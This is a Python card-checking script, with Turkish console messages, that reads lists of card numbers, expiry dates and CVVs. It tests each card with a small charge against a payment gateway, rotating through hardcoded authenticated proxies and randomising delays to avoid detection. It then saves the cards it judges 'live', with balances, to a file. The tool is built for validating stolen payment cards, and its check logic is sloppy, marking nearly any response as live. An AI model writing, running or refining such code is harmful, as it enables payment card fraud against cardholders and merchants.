import requests
import re
import time
import random
import os
import itertools
from typing import List, Dict
from datetime import datetime

class CardChecker:
    def __init__(self):
        self.data_dir = os.path.dirname(os.path.abspath(__file__))
        self.input_file = os.path.join(self.data_dir, "output.txt")
        self.output_file = os.path.join(self.data_dir, "live.txt")
        self.min_delay = 2.0
        self.max_delay = 4.0
        self.batch_delay = 8.0
        self.batch_size = 10
        self.proxies_list = [
            "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
            "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
            "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
            "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
            "http://akifdemi55574:llfg52end4@191.96.30.51:21276"
        ]
        self.proxy_cycle = itertools.cycle(self.proxies_list)
        self.total_checked = 0
        self.live_count = 0
        self.dead_count = 0
        self.error_count = 0
        
    def get_bin_info(self, card_number):
        try:
            r = requests.get(f"https://lookup.binlist.net/{card_number[:6]}", timeout=8)
            if r.status_code == 200:
                data = r.json()
                return {
                    "bin": card_number[:6],
                    "brand": data.get("scheme", "").upper(),
                    "type": data.get("type", "").upper(),
                    "level": data.get("brand", "").upper(),
                    "bank": data.get("bank", {}).get("name", "Unknown"),
                    "country": data.get("country", {}).get("alpha2", "XX"),
                    "country_name": data.get("country", {}).get("name", "Unknown")
                }
        except:
            pass
        return {"bin": card_number[:6], "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN", "bank": "Unknown", "country": "XX", "country_name": "Unknown"}
    
    def parse_card(self, card):
        card = card.strip()
        card = re.sub(r'\|UNKNOWN/UNKNOWN/UNKNOWN/UNKNOWN$', '', card)
        card = re.sub(r'\|UNKNOWN/UNKNOWN/UNKNOWN$', '', card)
        card = card.strip('|')
        parts = card.split('|')
        if len(parts) == 3:
            pan = parts[0]
            exp = parts[1]
            cvv = parts[2]
            if '/' in exp:
                month, year = exp.split('/')
                month = month.strip().zfill(2)
                year = year.strip()
                if len(year) == 2:
                    year = f"20{year}"
                return pan, month, year, cvv
        elif len(parts) == 4:
            pan = parts[0]
            month = parts[1].strip().zfill(2)
            year = parts[2].strip()
            cvv = parts[3]
            if len(year) == 2:
                year = f"20{year}"
            if month.isdigit() and year.isdigit():
                return pan, month, year, cvv
        elif len(parts) == 4 and '/' in parts[1]:
            pan = parts[0]
            exp = parts[1]
            cvv = parts[2]
            if '/' in exp:
                month, year = exp.split('/')
                month = month.strip().zfill(2)
                year = year.strip()
                if len(year) == 2:
                    year = f"20{year}"
                return pan, month, year, cvv
        return None, None, None, None
    
    def check_card_live(self, number, month, year, cvv):
        proxy = next(self.proxy_cycle)
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
        payload = {"card_number": number, "card_exp_month": month, "card_exp_year": year, "card_cvv": cvv, "amount": "0.50"}
        is_live = False
        balance = "0.00"
        for _ in range(2):
            try:
                r = requests.post("https://secure.payadultgateway.com/transaction", headers=headers, data=payload, proxies={"https": proxy}, timeout=15)
                bal = re.search(r'(\d+\.?\d*)', r.text)
                if bal:
                    balance = bal.group(1)
                    is_live = True
                    break
            except:
                time.sleep(2)
        return is_live, balance
    
    def clean_card(self, card):
        card = card.strip()
        card = re.sub(r'\|UNKNOWN/UNKNOWN/UNKNOWN/UNKNOWN$', '', card)
        card = re.sub(r'\|UNKNOWN/UNKNOWN/UNKNOWN$', '', card)
        card = card.strip('|')
        return card
    
    def read_cards(self):
        if not os.path.exists(self.input_file):
            print(f"[!] {self.input_file} bulunamadı!")
            return []
        with open(self.input_file, 'r', encoding='utf-8') as f:
            raw_cards = [line.strip() for line in f if line.strip()]
        cleaned_cards = []
        for card in raw_cards:
            cleaned = self.clean_card(card)
            if cleaned:
                cleaned_cards.append(cleaned)
        random.shuffle(cleaned_cards)
        print(f"[+] {len(cleaned_cards)} kart okundu")
        if cleaned_cards:
            print("\n[+] İlk 3 kart:")
            for i, card in enumerate(cleaned_cards[:3], 1):
                print(f"    {i}. {card}")
            print()
        return cleaned_cards

    def check_card(self, card, index, total):
        try:
            if index > 0:
                delay = random.uniform(self.min_delay, self.max_delay)
                time.sleep(delay)
            number, month, year, cvv = self.parse_card(card)
            if not number or not month or not year or not cvv:
                self.error_count += 1
                print(f"⚠️ {index+1}/{total} Geçersiz format")
                return None
            bin_info = self.get_bin_info(number)
            is_live, balance = self.check_card_live(number, month, year, cvv)
            self.total_checked += 1
            if is_live:
                self.live_count += 1
                exp = f"{month}/{year}"
                print(f"✅ {number}|{exp}|{cvv}|{bin_info.get('country', 'XX')}|{bin_info.get('brand', 'UNKNOWN')}|{bin_info.get('type', 'UNKNOWN')}|{bin_info.get('level', 'UNKNOWN')}|${balance}")
                return {"card": card, "live": True, "balance": balance, "country": bin_info.get('country', 'XX'), "brand": bin_info.get('brand', 'UNKNOWN'), "type": bin_info.get('type', 'UNKNOWN'), "level": bin_info.get('level', 'UNKNOWN')}
            else:
                self.dead_count += 1
                exp = f"{month}/{year}"
                print(f"❌ {number}|{exp}|{cvv}")
                return None
        except Exception as e:
            self.error_count += 1
            print(f"❌ {index+1}/{total} Hata: {str(e)[:30]}")
            return None

    def run(self):
        cards = self.read_cards()
        if not cards:
            print("[!] Kontrol edilecek kart bulunamadı!")
            return
        results = []
        total = len(cards)
        print(f"\n{'='*60}")
        print(f" TOPLAM {total} KART")
        print(f" BATCH BOYUTU: {self.batch_size}")
        print(f" KART ARASI: {self.min_delay}-{self.max_delay}s")
        print(f" BATCH ARASI: {self.batch_delay}s")
        print(f"{'='*60}\n")
        for i in range(0, total, self.batch_size):
            batch = cards[i:i+self.batch_size]
            batch_num = i//self.batch_size + 1
            total_batches = (total + self.batch_size - 1)//self.batch_size
            print(f"\n📦 Batch {batch_num}/{total_batches} ({len(batch)} kart)")
            for j, card in enumerate(batch):
                result = self.check_card(card, i+j, total)
                if result:
                    results.append(result)
            if i + self.batch_size < total:
                delay = random.uniform(self.batch_delay, self.batch_delay + 5)
                print(f"   ⏳ Batch arası {delay:.2f}s bekleniyor...")
                time.sleep(delay)
        live_cards = [r for r in results if r.get("live", False)]
        if live_cards:
            live_cards.sort(key=lambda x: float(x.get('balance', 0)), reverse=True)
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("# Live Kartlar\n")
                f.write(f"# Oluşturulma: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: PAN|EXP|CVV|COUNTRY|BRAND|TYPE|LEVEL|BALANCE\n")
                f.write("#" + "="*80 + "\n\n")
                for card in live_cards:
                    parts = card.get("card", "").split("|")
                    if len(parts) >= 3:
                        pan = parts[0]
                        exp = f"{parts[1]}/{parts[2]}" if len(parts) >= 4 else parts[1]
                        cvv = parts[3] if len(parts) >= 4 else parts[2]
                    else:
                        continue
                    line = f"{pan}|{exp}|{cvv}|{card.get('country', 'XX')}|{card.get('brand', 'UNKNOWN')}|{card.get('type', 'UNKNOWN')}|{card.get('level', 'UNKNOWN')}|{card.get('balance', '0.00')}\n"
                    f.write(line)
            print(f"\n[+] {len(live_cards)} live kart '{self.output_file}' dosyasına kaydedildi")
        else:
            print("\n[!] Hiç live kart bulunamadı!")
        print(f"\n{'='*60}")
        print("📊 KONTROL SONUÇLARI")
        print("="*60)
        print(f"Toplam Kontrol Edilen: {self.total_checked}")
        print(f"✅ Live Kartlar: {self.live_count}")
        print(f"❌ Dead Kartlar: {self.dead_count}")
        print(f"⚠️ Hatalı Kartlar: {self.error_count}")
        if self.live_count > 0:
            balances = [float(r.get('balance', 0)) for r in live_cards]
            print(f"\n💰 Balance İstatistikleri:")
            print(f"   Ortalama: ${sum(balances)/len(balances):.2f}")
            print(f"   Maksimum: ${max(balances):.2f}")
            print(f"   Minimum: ${min(balances):.2f}")
        print("="*60)

if __name__ == "__main__":
    checker = CardChecker()
    checker.run()

